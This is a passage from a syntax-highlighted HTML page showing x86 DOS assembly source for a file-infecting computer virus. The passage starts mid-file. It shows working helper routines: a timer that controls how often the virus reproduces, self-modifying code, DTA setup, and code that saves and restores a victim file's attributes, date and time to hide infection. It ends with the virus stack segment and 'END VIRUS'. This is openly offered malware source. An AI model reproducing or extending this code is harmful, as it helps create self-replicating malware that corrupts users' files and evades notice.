</span><span class="sc5">TIMECT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Determines how often to reproduce (1/64 here)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SHOULDRUN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">;zero ax to start, set z flag</span><span class="sc0">
</span><span class="sc5">SR1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;this gets replaced by NOP when program runs</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">TIMECT</span><span class="sc0">       </span><span class="sc1">;is it an even multiple of TIMECT+1 ticks?</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;return with z flag set if it is, else nz set</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;SETSR modifies SHOULDRUN so that the full procedure gets run</span><span class="sc0">
</span><span class="sc1">;it is redundant after the initial load</span><span class="sc0">
</span><span class="sc5">SETSR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90H</span><span class="sc0">          </span><span class="sc1">;NOP code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SR1</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;put it in place of RET above</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;and return</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine sets up the new DTA location at DTA1, and saves the location of</span><span class="sc0">
</span><span class="sc1">;the initial DTA in the variable OLDDTA.</span><span class="sc0">
</span><span class="sc5">NEW_DTA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2FH</span><span class="sc0">                  </span><span class="sc1">;get current DTA in ES:BX</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">;save it here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;set up ES</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DTA1</span><span class="sc0">          </span><span class="sc1">;set new DTA offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                     </span><span class="sc1">;and tell DOS where we want it</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine reverses the action of NEW_DTA and restores the DTA to its</span><span class="sc0">
</span><span class="sc1">;original value.</span><span class="sc0">
</span><span class="sc5">RESTORE_DTA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get original DTA seg:ofs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLDDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1AH</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">                     </span><span class="sc1">;and tell DOS where to put it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;restore ds before exiting</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine saves the original file attribute in FATTR, the file date and</span><span class="sc0">
</span><span class="sc1">;time in FDATE and FTIME, and the file size in FSIZE. It also sets the</span><span class="sc0">
</span><span class="sc1">;file attribute to read/write, and leaves the file opened in read/write</span><span class="sc0">
</span><span class="sc1">;mode (since it has to open the file to get the date and size), with the handle</span><span class="sc0">
</span><span class="sc1">;it was opened under in HANDLE. The file path and name is in USEFILE.</span><span class="sc0">
</span><span class="sc5">SAVE_ATTRIBUTE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43H</span><span class="sc0">          </span><span class="sc1">;get file attr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FATTR</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">;save it here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43H</span><span class="sc0">          </span><span class="sc1">;now set file attr to r/w</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;now that we know it's r/w</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc0">          </span><span class="sc1">;we can r/w access open file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">HANDLE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;save file handle here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57H</span><span class="sc0">          </span><span class="sc1">;and get the file date and time</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FTIME</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">;and save it here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FDATE</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">;and here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DTA1</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file size was set up here by</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;search routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DTA1</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;so move it to FSIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FSIZE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Restore file attribute, and date and time of the file as they were before</span><span class="sc0">
</span><span class="sc1">;it was infected. This also closes the file</span><span class="sc0">
</span><span class="sc5">REST_ATTRIBUTE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">FDATE</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get old date and time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">FTIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57H</span><span class="sc0">          </span><span class="sc1">;set file date and time to old value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">HANDLE</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">FATTR</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43H</span><span class="sc0">          </span><span class="sc1">;Set file attr to old value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">USEFILE</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FINAL</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;last byte of code to be kept in virus</span><span class="sc0">

</span><span class="sc5">VSEG</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus stack segment</span><span class="sc0">

</span><span class="sc5">VSTACK</span><span class="sc0">  </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc5">STACK</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">STACKSIZE</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">VSTACK</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0">               </span><span class="sc1">;Entry point is the virus</span></div></body>
</html>
